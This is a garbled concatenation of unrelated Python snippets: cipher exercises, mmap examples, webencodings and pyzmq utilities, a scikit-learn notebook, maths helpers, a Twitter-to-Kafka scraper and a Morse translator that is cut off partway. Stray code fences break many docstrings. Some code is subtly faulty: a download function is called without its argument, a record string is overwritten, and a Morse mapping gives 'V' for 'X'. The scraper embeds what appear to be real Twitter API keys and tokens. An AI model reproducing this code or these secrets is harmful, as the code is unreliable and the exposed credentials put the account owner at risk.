# Copyright (C) 2012 The Python Software Foundation.
# See LICENSE.txt and CONTRIBUTORS.txt.
#```


```pyBackports for individual classes and functions."""

import os
import sys

__all__ = ["cache_from_source", "callable", "fsencode"]


try:
    from imp import cache_from_source
except ImportError:

    def cache_from_source(py_file, debug=__debug__):
        ext = debug and "c" or "o"
        return py_file + ext


try:
    callable = callable
except NameError:
    from collections import Callable

    def callable(obj):
        return isinstance(obj, Callable)


try:
    fsencode = os.fsencode
except AttributeError:

    def fsencode(filename):
        if isinstance(filename, bytes):
            return filename
        elif isinstance(filename, str):
            return filename.encode(sys.getfilesystemencoding())
        else:
            raise TypeError("expect bytes or str, not %s" % type(filename).__name__)

def mixed_keyword(key: str = "college", pt: str = "UNIVERSITY") -> str:
    """

    For key:hello

    H E L O
    A B C D
    F G I J
    K M N P
    Q R S T
    U V W X
    Y Z
    and map vertically

    >>> mixed_keyword("college", "UNIVERSITY")  # doctest: +NORMALIZE_WHITESPACE
    {'A': 'C', 'B': 'A', 'C': 'I', 'D': 'P', 'E': 'U', 'F': 'Z', 'G': 'O', 'H': 'B',
     'I': 'J', 'J': 'Q', 'K': 'V', 'L': 'L', 'M': 'D', 'N': 'K', 'O': 'R', 'P': 'W',
     'Q': 'E', 'R': 'F', 'S': 'M', 'T': 'S', 'U': 'X', 'V': 'G', 'W': 'H', 'X': 'N',
     'Y': 'T', 'Z': 'Y'}
    'XKJGUFMJST'
    """
    key = key.upper()
    pt = pt.upper()
    temp = []
    for i in key:
        if i not in temp:
            temp.append(i)
    len_temp = len(temp)
    # print(temp)
    alpha = []
    modalpha = []
    for j in range(65, 91):
        t = chr(j)
        alpha.append(t)
        if t not in temp:
            temp.append(t)
    # print(temp)
    r = int(26 / 4)
    # print(r)
    k = 0
    for _ in range(r):
        s = []
        for j in range(len_temp):
            s.append(temp[k])
            if not (k < 25):
                break
            k += 1
        modalpha.append(s)
    # print(modalpha)
    d = {}
    j = 0
    k = 0
    for j in range(len_temp):
        for m in modalpha:
            if not (len(m) - 1 >= j):
                break
            d[alpha[k]] = m[j]
            if not k < 25:
                break
            k += 1
    print(d)
    cypher = ""
    for i in pt:
        cypher += d[i]
    return cypher


print(mixed_keyword("college", "UNIVERSITY"))
````

```py

    webencodings.mklabels
    ~~~~~~~~~~~~~~~~~~~~~

    Regenarate the webencodings.labels module.

    :copyright: Copyright 2012 by Simon Sapin
    :license: BSD, see LICENSE for details.
```

````py

import json

try:
    from urllib import urlopen
except ImportError:
    from urllib.request import urlopen


def assert_lower(string):
    assert string == string.lower()
    return string


def generate(url):
    parts = [
        '''\```


```py

    webencodings.labels
    ~~~~~~~~~~~~~~~~~~~

    Map encoding labels to their name.

    :copyright: Copyright 2012 by Simon Sapin
    :license: BSD, see LICENSE for details.
````

````py

# XXX Do not edit!
# This file is automatically generated by mklabels.py

LABELS = {
'''
    ]
    labels = [
        (repr(assert_lower(label)).lstrip("u"), repr(encoding["name"]).lstrip("u"))
        for category in json.loads(urlopen(url).read().decode("ascii"))
        for encoding in category["encodings"]
        for label in encoding["labels"]
    ]
    max_len = max(len(label) for label, name in labels)
    parts.extend(
        "    %s:%s %s,\n" % (label, " " * (max_len - len(label)), name)
        for label, name in labels
    )
    parts.append("}")
    return "".join(parts)


if __name__ == "__main__":
    print(generate("http://encoding.spec.whatwg.org/encodings.json"))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyReading from a memory mapped file.```


```py

#end_pymotw_header
import mmap

with open('lorem.txt', 'r') as f:
    with mmap.mmap(f.fileno(), 0,
                   access=mmap.ACCESS_READ) as m:
        print('First 10 bytes via read :', m.read(10))
        print('First 10 bytes via slice:', m[:10])
        print('2nd   10 bytes via read :', m.read(10))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pySearching memory mapped files with regular expressions.```


```py

#end_pymotw_header
import mmap
import re

pattern = re.compile(rb'(\.\W+)?([^.]?nulla[^.]*?\.)',
                     re.DOTALL | re.IGNORECASE | re.MULTILINE)

with open('lorem.txt', 'r') as f:
    with mmap.mmap(f.fileno(), 0,
                   access=mmap.ACCESS_READ) as m:
        for match in pattern.findall(m):
            print(match[1].replace(b'\n', b' '))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyWriting to a memory mapped file with ACCESS_COPY.```


```py

#end_pymotw_header
import mmap
import shutil

# Copy the example file
shutil.copyfile('lorem.txt', 'lorem_copy.txt')

word = b'consectetuer'
reversed = word[::-1]

with open('lorem_copy.txt', 'r+') as f:
    with mmap.mmap(f.fileno(), 0,
                   access=mmap.ACCESS_COPY) as m:
        print('Memory Before:\n{}'.format(
            m.readline().rstrip()))
        print('File Before  :\n{}\n'.format(
            f.readline().rstrip()))

        m.seek(0)  # rewind
        loc = m.find(word)
        m[loc:loc + len(word)] = reversed

        m.seek(0)  # rewind
        print('Memory After :\n{}'.format(
            m.readline().rstrip()))

        f.seek(0)
        print('File After   :\n{}'.format(
            f.readline().rstrip()))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyWriting to a memory mapped file using a slice assignment.```


```py

#end_pymotw_header
import mmap
import shutil

# Copy the example file
shutil.copyfile('lorem.txt', 'lorem_copy.txt')

word = b'consectetuer'
reversed = word[::-1]
print('Looking for    :', word)
print('Replacing with :', reversed)

with open('lorem_copy.txt', 'r+') as f:
    with mmap.mmap(f.fileno(), 0) as m:
        print('Before:\n{}'.format(m.readline().rstrip()))
        m.seek(0)  # rewind

        loc = m.find(word)
        m[loc:loc + len(word)] = reversed
        m.flush()

        m.seek(0)  # rewind
        print('After :\n{}'.format(m.readline().rstrip()))

        f.seek(0)  # rewind
        print('File  :\n{}'.format(f.readline().rstrip()))

# -*- coding: utf-8 -*-```


```pymobile_price_range_classification.py

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1tYIzendTZauKei2cfcFt0Uqm8frWY-bS

The problem statement given below:

Bob has started his own mobile company. He wants to give tough fight to big companies like Apple,Samsung etc.

He does not know how to estimate price of mobiles his company creates. In this competitive mobile phone market you cannot simply assume things. To solve this problem he collects sales data of mobile phones of various companies.

Bob wants to find out some relation between features of a mobile phone(eg:- RAM,Internal Memory etc) and its selling price. But he is not so good at Machine Learning. So he needs your help to solve this problem.

In this problem you do not have to predict actual price but a price range indicating how high the price is.



---
So for this problem statement we will proceed with following steps to classify the target variable i.e. price_range with value of 0(low cost), 1(medium cost), 2(high cost) and 3(very high cost):

- Data training using the mobile price classification dataset.
- Model creation which will include importing logistic regression from sklearn, initializing the classifier, then fit the training data into it and perform classification.
---

For the dataset being used [click here](https://www.kaggle.com/iabhishekofficial/mobile-price-classification?select=train.csv)

#### Data Preprocessing and Exploration.```


```py

# importing pandas library.
import pandas as pd

data = pd.read_csv("/content/train.csv")
data

# converting data into int datatype to avoid errors below.
prepareddata = data.astype(int)
prepareddata.head()
````

````py#### Data Training & Model Creation.

Data Training:```


```py

# Import train_test_split from sklearn.model_selection
from sklearn.model_selection import train_test_split

# Here, x is the data which will have features for classification and y will have our target i.e. price range of the mobiles.
x = prepareddata.drop(["price_range"], axis=1)
y = prepareddata["price_range"]

# Split data into training data and testing data.
# Ratio used for splitting training and testing data is 8:2 respectively
x_train, x_test, y_train, y_test = train_test_split(
    x, y, test_size=0.2, random_state=100
)
````

```pyModel Creation:"""

# Importing logistic regression model
from sklearn.linear_model import LogisticRegression

clfr = LogisticRegression()

# Fitting data into the model.
clfr.fit(x_train, y_train)

# Making predictions
pred = clfr.predict(x_test)

pred
```

```pyThe above predictions are made by Logistic Regression model."""

```

````py
References: https://en.wikipedia.org/wiki/M%C3%B6bius_function
References: wikipedia:square free number
python/black : True
flake8 : True```


```py

from maths.is_square_free import is_square_free
from maths.prime_factors import prime_factors


def mobius(n: int) -> int:
    """
    Mobius function
    >>> mobius(24)
    0
    >>> mobius(-1)
    1
    >>> mobius('asd')
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'str'
    >>> mobius(10**400)
    0
    >>> mobius(10**-400)
    1
    >>> mobius(-1424)
    1
    >>> mobius([1, '2', 2.0])
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'list'
    """
    factors = prime_factors(n)
    if is_square_free(factors):
        return -1 if len(factors) % 2 else 1
    return 0


if __name__ == "__main__":
    import doctest

    doctest.testmod()

import tweepy
import time
from kafka import KafkaConsumer, KafkaProducer
consumer_key = "dRbebEWASLlPzAI3prM9OBv4i"
consumer_secret = "625WMQtDbywEsI6er8QzAmOC1bX1nUJxWTNwXmJTGdz9bUw6Mv"
access_token = "1355447968292192256-6ta4K9q0dLWkiqaWykGPQe0pX25gxe"
access_token_secret = "IEXsiLYfTKOFuEXkL9x6QHx71G6wZOjcVBpvK1LJbfndk"
auth = tweepy.OAuthHandler(consumer_key,consumer_secret)
auth.set_access_token(access_token,access_token_secret)
api = tweepy.API(auth)
from datetime import datetime
def normalize_timestamp(time):
  mytime = datetime.strptime(time, "%Y-%m-%d %H:%M:%S")
  return(mytime.strftime("%Y-%m-%d %H:%M:%S"))
producer = KafkaProducer(bootstrap_servers=['localhost:9092'],api_version=(2,0,2))
topic_name = 'dhruv2612'
def get_twitter_data():
  res = api.search("BCCI")
  for i in res:
    record = ''
    record += str(i.user.id_str)
    record = '\n'
    record += str(i.text)
    record += ';\n'
    record += str(normalize_timestamp(str(i.created_at)))
    record += ';'
    record += str(i.user.followers_count)
    record += ';'
    record += str(i.user.location)
    record += ';'
    record += str(i.favorite_count)
    record += ';'
    record += str(i.retweet_count)
    record += ';'
    producer.send(topic_name, str.encode(record))
get_twitter_data()

def periodic_work(interval):
  while True:
    get_twitter_data()
    time.sleep(interval)

periodic_work(60*0.1)

import random
import urllib.request


def downloadImage(url):
    filename = str(random.randrange(1, 1000))
    download = urllib.request.urlretrieve(url, filename)


downloadImage()

#!/usr/bin/python
# -*- coding: utf-8 -*-


# Mode
# mode or modal value, is the number in data
# that has highest frequency, or occurs in data/array
# maximum number of times

# This function produces an outline of data
# each element occurs only once in outline
# that means no repeats of same numbers
def reduce_data(data):
    # Simplest way to do this, just 1 line of code:
    # return list(set(data))
    # since set data structure does not have repeats

    # But below code is much more
    # illustrative and easier to understand

    data_outline = []
    for item in data:
        if item not in data_outline:
            data_outline.append(item)

    return data_outline


# To find mode, we apply same principle, that works
# behind finding the maximum or minimum number(see max.py, min.py)
def mode(data):
    mode_ = data[0]
    max_frequency = data.count(data[0])

    # Insted of iterating through every repeat of
    # same number, then counting multiple repeats
    # of number multiple times, iterating through outline
    # of data is convinient, less time consuming.
    for value in reduce_data(data[1:]):
        if data.count(value) > max_frequency:
            mode_ = value
            max_frequency = data.count(value)

    # instead of just mode, it's freq
    # can also be helpful
    return (mode_, max_frequency)


# Test
# Add your test cases
tests = [
    [19, 17, 25, 34, 57, 17, 25, 52, 47, 42, 25, 17, 3, 0, 3, 41, 17],
    [1917, 2534, 5717, 1725, 5247, 1917, 4117, 5717, 17303, 1917],
]

# Function does work,
# Check yourself
for test in tests:
    modal_v = mode(test)
    print("\nData outline: {}".format(reduce_data(test)))
    print("Mode: {}\nFrequency: {}".format(modal_v[0], modal_v[1]))

print("")

# Mode for un-grouped data
````

````py
Iterative in-place solution using nested loops```


```py
def rotate_image(image):
  for row in image:
    row.reverse()
  for i in range(len(image)):
    for j in range(i):
      image[i][j], image[j][i] = image[j][i], image[i][j]
  return image


# Some print tests
print(rotate_image([
  [1, 2],
  [3, 4]
]))  # should print [ [ 2, 4 ], [ 1, 3 ] ]

print(rotate_image([
  [1, 1, 5, 9, 9],
  [2, 2, 6, 0, 0],
  [3, 3, 7, 1, 1],
  [4, 4, 8, 2, 2],
  [5, 5, 9, 3, 3]
]))  # should print [ [ 9, 0, 1, 2, 3 ],
     #                [ 9, 0, 1, 2, 3 ],
     #                [ 5, 6, 7, 8, 9 ],
     #                [ 1, 2, 3, 4, 5 ],
     #                [ 1, 2, 3, 4, 5 ] ]```


```py
    pygments.modeline
    ~~~~~~~~~~~~~~~~~

    A simple modeline parser (based on pymodeline).

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import re

__all__ = ['get_filetype_from_buffer']


modeline_re = re.compile(r'''
    (?: vi | vim | ex ) (?: [<=>]? \d* )? :
    .* (?: ft | filetype | syn | syntax ) = ( [^:\s]+ )
''', re.VERBOSE)


def get_filetype_from_line(l):
    m = modeline_re.search(l)
    if m:
        return m.group(1)


def get_filetype_from_buffer(buf, max_lines=5):
    """
    Scan the buffer for modelines and return filetype if one is found.
    """
    lines = buf.splitlines()
    for l in lines[-1:-max_lines-1:-1]:
        ret = get_filetype_from_line(l)
        if ret:
            return ret
    for i in range(max_lines, -1, -1):
        if i < len(lines):
            ret = get_filetype_from_line(lines[i])
            if ret:
                return ret

    return None
````

````py
My Modified Solution to Selection Sort Algorithm,
instead of swapping elem it is appended to another
temporary array. This makes algotrihm less complicated.```


```py


def selection_sort(array):
    temp_num = len(array)
    temp_arr = []
    while len(temp_arr) != temp_num:
        a = min(array)
        temp_arr.append(a)
        del array[array.index(a)]
    return temp_arr


# Test
test_case = [100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90]
print("By Builtin method: {}".format(sorted(test_case)))
print("By SelectionSort method: {}".format(selection_sort(test_case)))

# l = [1, 2, 3, 4, 5, 6]

# def modify_list(l):
#     for j in range(len(l) - 1, -1, -1):
#         if l[j] % 2 != 0:
#             l.remove(l[j])
#         else:
#             l[j] //= 2


# modify_list(l)
# print(l)
# output must be [1,2,3]```


```pyWrite the function modify_list (l), which takes a list of integers as
an input, removes all odd values from it, and evenly divides even numbers
by two. The function should not return anything, it only requires
changing the transferred list, for example:

lst = [1, 2, 3, 4, 5, 6]
print (modify_list (lst)) # None
print (lst) # [1, 2, 3]
modify_list (lst)
print (lst) # [1]

lst = [10, 5, 8, 3]
modify_list (lst)
print (lst) # [5, 4]
The function should not carry out input / output information.```


```py


def modify_list(seq):
    #  Iterating backwards prevents the indexing
    #  to be incorrect wile manipulating the
    #  list in place, i.e. removing items from the last item (higher indices)
    #  will not affect the index of the succeeding items (lower indices)
    for i in range(len(seq) - 1, -1, -1):
        #  Odd number using bitwise op
        if seq[i] & 1:
            #  Remove the odd num
            seq.pop(i)
        #  Perform operation on even num
        else:
            seq[i] = seq[i] // 2


l = [1, 2, 3, 4, 5, 6]
modify_list(l)
print(l)
````

````py
    Modular Exponential.
    Modular exponentiation is a type of exponentiation performed over a modulus.
    For more explanation, please check
    https://en.wikipedia.org/wiki/Modular_exponentiation```


```py
````

```pyCalculate Modular Exponential."""


def modular_exponential(base: int, power: int, mod: int):
    """
    >>> modular_exponential(5, 0, 10)
    1
    >>> modular_exponential(2, 8, 7)
    4
    >>> modular_exponential(3, -2, 9)
    -1
    """

    if power < 0:
        return -1
    base %= mod
    result = 1

    while power > 0:
        if power & 1:
            result = (result * base) % mod
        power = power >> 1
        base = (base * base) % mod

    return result


def main():
    """Call Modular Exponential Function."""
    print(modular_exponential(3, 200, 13))


if __name__ == "__main__":
    import doctest

    doctest.testmod()

    main()

import random


inside = random.randint(1, 37890)  # choses a random integer between given range
print(inside)

outside = random.randrange(1, 1000)  # choses a random number number in given range
print(outside)

colors = ["green", "black", "blue", "yellow", "white"]
print(random.choice(colors))  # choses random element from list

# Imagine a school that children attend for years. In each year, there are a certain number of groups started, marked with the letters. So if years = 7 and groups = 4For the first year, the groups are 1a, 1b, 1c, 1d, and for the last year, the groups are 7a, 7b, 7c, 7d.

# Write a function that returns the groups in the school by year (as a string), separated with a comma and space in the form of "1a, 1b, 1c, 1d, 2a, 2b (....) 6d, 7a, 7b, 7c, 7d".

# Examples:

# csSchoolYearsAndGroups(years = 7, groups = 4) ➞ "1a, 1b, 1c, 1d, 2a, 2b, 2c, 2d, 3a, 3b, 3c, 3d, 4a, 4b, 4c, 4d, 5a, 5b, 5c, 5d, 6a, 6b, 6c, 6d, 7a, 7b, 7c, 7d"
# Notes:

# 1 <= years <= 10
# 1 <= groups <=26
# [execution time limit] 4 seconds (py3)

# [input] integer years

# [input] integer groups

# [output] string


def schoolGroups(years, groups):
    alphabet = list(map(chr, range(97, 123)))
    emp_list = []
    for year in range(1, years + 1):
        for group in range(0, groups):
            emp_list.append(f"{year}{alphabet[group]}")
    # print(emp_list)
    return ", ".join(emp_list)


print(schoolGroups(1, 4))
print(schoolGroups(6, 7))

# Given a start integer and an ending integer (both inclusive), write a function that returns the count (not the sum) of all integers in the range (except integers that contain the digit 5).

# Examples:

# csAnythingButFive(1, 5) -> 1, 2, 3, 4, -> 4 (there are 4 integers in the range that do not contain the digit 5)
# csAnythingButFive(1, 9) -> 1, 2, 3, 4, 6, 7, 8, 9 -> 8
# csAnythingButFive(4, 17) -> 4,6,7,8,9,10,11,12,13,14,16,17 -> 12
# Notes:

# The output can contain the digit 5.
# The start number will always be less than the end number (both numbers can also be negative).
# [execution time limit] 4 seconds (py3)

# [input] integer start

# [input] integer end

# [output] integer


def csAnythingButFive(start, end):
    count = 0
    new_list = []
    for num in range(start, end + 1):
        str_num = str(num)
        if "5" in str_num:
            continue
        count += 1
    return count


print(csAnythingButFive(1, 5))
print(csAnythingButFive(1, 9))
print(csAnythingButFive(4, 17))
print(csAnythingButFive(-4, 17))
print(csAnythingButFive(0, 7))
print(csAnythingButFive(-14, -5))
# uper
# input 2 integers
# output 1 integer = a count of numbers in range(start, end)
# start < end
# the 2 nums cand be negative
# PLAN
# for loop in range(start, end + 1)
# if num == 5 skip
# else count(num)

import sys
import os

# Module "sys"
#
# See docs for the sys module: https://docs.python.org/3.7/library/sys.html

# Print out the command line arguments in sys.argv, one per line:
for arg in sys.argv:
    print(arg)

# Print out the platform from sys:
print(sys.platform)

# Print out the Python version from sys:
print(sys.version)


# Module "os"
#
# See the docs for the OS module: https://docs.python.org/3.7/library/os.html

# Print the current process ID
print(os.getpid())

# Print the current working directory (cwd):
print(os.getcwd())

# Print your login name
print(os.getlogin())
```

````py
Functions useful for doing molecular chemistry:
* molarity_to_normality
* moles_to_pressure
* moles_to_volume
* pressure_and_volume_to_temperature```


```py


def molarity_to_normality(nfactor: int, moles: float, volume: float) -> float:
    """
    Convert molarity to normality.
      Volume is taken in litres.

      Wikipedia reference: https://en.wikipedia.org/wiki/Equivalent_concentration
      Wikipedia reference: https://en.wikipedia.org/wiki/Molar_concentration

      >>> molarity_to_normality(2, 3.1, 0.31)
      20
      >>> molarity_to_normality(4, 11.4, 5.7)
      8
    """
    return round((float(moles / volume) * nfactor))


def moles_to_pressure(volume: float, moles: float, temperature: float) -> float:
    """
    Convert moles to pressure.
      Ideal gas laws are used.
      Temperature is taken in kelvin.
      Volume is taken in litres.
      Pressure has atm as SI unit.

      Wikipedia reference: https://en.wikipedia.org/wiki/Gas_laws
      Wikipedia reference: https://en.wikipedia.org/wiki/Pressure
      Wikipedia reference: https://en.wikipedia.org/wiki/Temperature

      >>> moles_to_pressure(0.82, 3, 300)
      90
      >>> moles_to_pressure(8.2, 5, 200)
      10
    """
    return round(float((moles * 0.0821 * temperature) / (volume)))


def moles_to_volume(pressure: float, moles: float, temperature: float) -> float:
    """
    Convert moles to volume.
      Ideal gas laws are used.
      Temperature is taken in kelvin.
      Volume is taken in litres.
      Pressure has atm as SI unit.

      Wikipedia reference: https://en.wikipedia.org/wiki/Gas_laws
      Wikipedia reference: https://en.wikipedia.org/wiki/Pressure
      Wikipedia reference: https://en.wikipedia.org/wiki/Temperature

      >>> moles_to_volume(0.82, 3, 300)
      90
      >>> moles_to_volume(8.2, 5, 200)
      10
    """
    return round(float((moles * 0.0821 * temperature) / (pressure)))


def pressure_and_volume_to_temperature(
    pressure: float, moles: float, volume: float
) -> float:
    """
    Convert pressure and volume to temperature.
      Ideal gas laws are used.
      Temperature is taken in kelvin.
      Volume is taken in litres.
      Pressure has atm as SI unit.

      Wikipedia reference: https://en.wikipedia.org/wiki/Gas_laws
      Wikipedia reference: https://en.wikipedia.org/wiki/Pressure
      Wikipedia reference: https://en.wikipedia.org/wiki/Temperature

      >>> pressure_and_volume_to_temperature(0.82, 1, 2)
      20
      >>> pressure_and_volume_to_temperature(8.2, 5, 3)
      60
    """
    return round(float((pressure * volume) / (0.0821 * moles)))


if __name__ == "__main__":

    import doctest

    doctest.testmod()

# -*- coding: utf-8 -*-```


```pyModule holding utility and convenience functions for zmq event monitoring."""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import struct
import zmq
from zmq.error import _check_version


def parse_monitor_message(msg):
    """decode zmq_monitor event messages.

    Parameters
    ----------
    msg : list(bytes)
        zmq multipart message that has arrived on a monitor PAIR socket.

        First frame is::

            16 bit event id
            32 bit event value
            no padding

        Second frame is the endpoint as a bytestring

    Returns
    -------
    event : dict
        event description as dict with the keys `event`, `value`, and `endpoint`.
    """

    if len(msg) != 2 or len(msg[0]) != 6:
        raise RuntimeError("Invalid event message format: %s" % msg)
    event = {
        'event': struct.unpack("=hi", msg[0])[0],
        'value': struct.unpack("=hi", msg[0])[1],
        'endpoint': msg[1],
    }
    return event


def recv_monitor_message(socket, flags=0):
    """Receive and decode the given raw message from the monitoring socket and return a dict.

    Requires libzmq ≥ 4.0

    The returned dict will have the following entries:
      event     : int, the event id as described in libzmq.zmq_socket_monitor
      value     : int, the event value associated with the event, see libzmq.zmq_socket_monitor
      endpoint  : string, the affected endpoint

    Parameters
    ----------
    socket : zmq PAIR socket
        The PAIR socket (created by other.get_monitor_socket()) on which to recv the message
    flags : bitfield (int)
        standard zmq recv flags

    Returns
    -------
    event : dict
        event description as dict with the keys `event`, `value`, and `endpoint`.
    """
    _check_version((4, 0), 'libzmq event API')
    # will always return a list
    msg = socket.recv_multipart(flags)
    # 4.0-style event API
    return parse_monitor_message(msg)


__all__ = ['parse_monitor_message', 'recv_monitor_message']
````

````pypure Python monitored_queue function

For use when Cython extension is unavailable (PyPy).

Authors
-------
* MinRK```


```py

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import zmq


def _relay(ins, outs, sides, prefix, swap_ids):
    msg = ins.recv_multipart()
    if swap_ids:
        msg[:2] = msg[:2][::-1]
    outs.send_multipart(msg)
    sides.send_multipart([prefix] + msg)


def monitored_queue(
    in_socket, out_socket, mon_socket, in_prefix=b'in', out_prefix=b'out'
):

    swap_ids = in_socket.type == zmq.ROUTER and out_socket.type == zmq.ROUTER

    poller = zmq.Poller()
    poller.register(in_socket, zmq.POLLIN)
    poller.register(out_socket, zmq.POLLIN)
    while True:
        events = dict(poller.poll())
        if in_socket in events:
            _relay(in_socket, out_socket, mon_socket, in_prefix, swap_ids)
        if out_socket in events:
            _relay(out_socket, in_socket, mon_socket, out_prefix, swap_ids)


__all__ = ['monitored_queue']
````

```pyMonitoredQueue classes and functions."""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.


from zmq import ZMQError, PUB
from zmq.devices.proxydevice import ProxyBase, Proxy, ThreadProxy, ProcessProxy
from zmq.devices.monitoredqueue import monitored_queue


class MonitoredQueueBase(ProxyBase):
    """Base class for overriding methods."""

    _in_prefix = b''
    _out_prefix = b''

    def __init__(
        self, in_type, out_type, mon_type=PUB, in_prefix=b'in', out_prefix=b'out'
    ):

        ProxyBase.__init__(self, in_type=in_type, out_type=out_type, mon_type=mon_type)

        self._in_prefix = in_prefix
        self._out_prefix = out_prefix

    def run_device(self):
        ins, outs, mons = self._setup_sockets()
        monitored_queue(ins, outs, mons, self._in_prefix, self._out_prefix)


class MonitoredQueue(MonitoredQueueBase, Proxy):
    """Class for running monitored_queue in the background.

    See zmq.devices.Device for most of the spec. MonitoredQueue differs from Proxy,
    only in that it adds a ``prefix`` to messages sent on the monitor socket,
    with a different prefix for each direction.

    MQ also supports ROUTER on both sides, which zmq.proxy does not.

    If a message arrives on `in_sock`, it will be prefixed with `in_prefix` on the monitor socket.
    If it arrives on out_sock, it will be prefixed with `out_prefix`.

    A PUB socket is the most logical choice for the mon_socket, but it is not required.
    """

    pass


class ThreadMonitoredQueue(MonitoredQueueBase, ThreadProxy):
    """Run zmq.monitored_queue in a background thread.

    See MonitoredQueue and Proxy for details.
    """

    pass


class ProcessMonitoredQueue(MonitoredQueueBase, ProcessProxy):
    """Run zmq.monitored_queue in a separate process.

    See MonitoredQueue and Proxy for details.
    """


__all__ = ['MonitoredQueue', 'ThreadMonitoredQueue', 'ProcessMonitoredQueue']

from typing import Literal

LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


def translate_message(
    key: str, message: str, mode: Literal["encrypt", "decrypt"]
) -> str:
    """
    >>> translate_message("QWERTYUIOPASDFGHJKLZXCVBNM","Hello World","encrypt")
    'Pcssi Bidsm'
    """
    chars_a = LETTERS if mode == "decrypt" else key
    chars_b = key if mode == "decrypt" else LETTERS
    translated = ""
    # loop through each symbol in the message
    for symbol in message:
        if symbol.upper() in chars_a:
            # encrypt/decrypt the symbol
            sym_index = chars_a.find(symbol.upper())
            if symbol.isupper():
                translated += chars_b[sym_index].upper()
            else:
                translated += chars_b[sym_index].lower()
        else:
            # symbol is not in LETTERS, just add it
            translated += symbol
    return translated


def encrypt_message(key: str, message: str) -> str:
    """
    >>> encrypt_message("QWERTYUIOPASDFGHJKLZXCVBNM", "Hello World")
    'Pcssi Bidsm'
    """
    return translate_message(key, message, "encrypt")


def decrypt_message(key: str, message: str) -> str:
    """
    >>> decrypt_message("QWERTYUIOPASDFGHJKLZXCVBNM", "Hello World")
    'Itssg Vgksr'
    """
    return translate_message(key, message, "decrypt")


def main() -> None:
    message = "Hello World"
    key = "QWERTYUIOPASDFGHJKLZXCVBNM"
    mode = "decrypt"  # set to 'encrypt' or 'decrypt'

    if mode == "encrypt":
        translated = encrypt_message(key, message)
    elif mode == "decrypt":
        translated = decrypt_message(key, message)
    print(f"Using the key {key}, the {mode}ed message is: {translated}")


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    main()

from __future__ import annotations

import random


class Dice:
    NUM_SIDES = 6

    def __init__(self):
        """Initialize a six sided dice"""
        self.sides = list(range(1, Dice.NUM_SIDES + 1))

    def roll(self):
        return random.choice(self.sides)

    def _str_(self):
        return "Fair Dice"


def throw_dice(num_throws: int, num_dice: int = 2) -> list[float]:
    """
    Return probability list of all possible sums when throwing dice.

    >>> random.seed(0)
    >>> throw_dice(10, 1)
    [10.0, 0.0, 30.0, 50.0, 10.0, 0.0]
    >>> throw_dice(100, 1)
    [19.0, 17.0, 17.0, 11.0, 23.0, 13.0]
    >>> throw_dice(1000, 1)
    [18.8, 15.5, 16.3, 17.6, 14.2, 17.6]
    >>> throw_dice(10000, 1)
    [16.35, 16.89, 16.93, 16.6, 16.52, 16.71]
    >>> throw_dice(10000, 2)
    [2.74, 5.6, 7.99, 11.26, 13.92, 16.7, 14.44, 10.63, 8.05, 5.92, 2.75]
    """
    dices = [Dice() for i in range(num_dice)]
    count_of_sum = [0] * (len(dices) * Dice.NUM_SIDES + 1)
    for i in range(num_throws):
        count_of_sum[sum(dice.roll() for dice in dices)] += 1
    probability = [round((count * 100) / num_throws, 2) for count in count_of_sum]
    return probability[num_dice:]  # remove probability of sums that never appear


if __name__ == "__main__":
    import doctest

    doctest.testmod()

import encrypt
import decrypt

# here i have used the standard morse code chart provided by wikipedia and other website
# I have also added a photo in readme which you can check for better understanding
morsecode = {
    'A': '.-',
    'B': '-...',
    'C': '-.-.',
    'D': '-..',
    'E': '.',
    'F': '..-.',
    'G': '--.',
    'H': '....',
    'I': '..',
    'J': '.---',
    'K': '-.-',
    'L': '.-..',
    'M': '--',
    'N': '-.',
    'O': '---',
    'P': '.--.',
    'Q': '--.-',
    'R': '.-.',
    'S': '...',
    'T': '-',
    'U': '..-',
    'V': '...-',
    'W': '.--',
    'X': '-..-',
    'Y': '-.--',
    'Z': '--..',
    '1': '.----',
    '2': '..---',
    '3': '...--',
    '4': '....-',
    '5': '.....',
    '6': '-....',
    '7': '--...',
    '8': '---..',
    '9': '----.',
    '0': '-----',
    ', ': '--..--',
    '.': '.-.-.-',
    '?': '..--..',
    '/': '-..-.',
    '-': '-....-',
    '(': '-.--.',
    ')': '-.--.-'
}

if __name__ == "__main__":
    while True:
        print('\nHello welcome to Tejas morse Code translator')
        print('press 1 for English to morse Code Converter : ')
        print('press 2 for morse code to English Converter : ')
        print('press 3 to exit')
        x = input('')
        if x == '1':
            z = input('Enter the text you want to convert to morse code:')
            e_msg = encrypt.encrypt(z, morsecode)
            e_string = ""
            for i in e_msg:
                e_string = e_string + i + "/ "
            e_string = e_string[:-2]
            print('encrypted code:' + e_string)
        elif x == '2':
            z = input('Enter the morse Code to convert to english:')
            d_msg = decrypt.decrypt(z, morsecode)
            d_string = ""
            for i in d_msg:
                d_string = d_string + i + ' '
            d_string = d_string[:-1]
            print(d_string)
        elif x == '3':
            exit(True)
        else:
            print('invalid input')
            continue

def decodeMorse(morseCode):
    # ToDo: Accept dots, dashes and spaces, return human-readable message
    morse_code = {".-" : "A",
                  "-..." : "B",
                  "-.-." : "C",
                  "-.." : "D",
                  "." : "E",
                  "..-." : "F",
                  "--." : "G",
                  "...." : "H",
                  ".." : "I",
                  ".---" : "J",
                  "-.-" : "K",
                  ".-.." : "L",
                  "--" : "M",
                  "-." : "N",
                  "---" : "O",
                  ".--." : "P",
                  "--.-" : "Q",
                  ".-." : "R",
                  "..." : "S",
                  "-" : "T",
                  "..-" : "U",
                  "...-" : "V",
                  ".--" : "W",
                  "-..-" : "V",
                  "-.--" : "Y",
                  "--.." : "Z",
                  ".----" : "1",
                  "..---" : "2",
                  "...--" : "3",
                  "....-" : "4",
                  "....." : "5",
                  "-...." : "6",
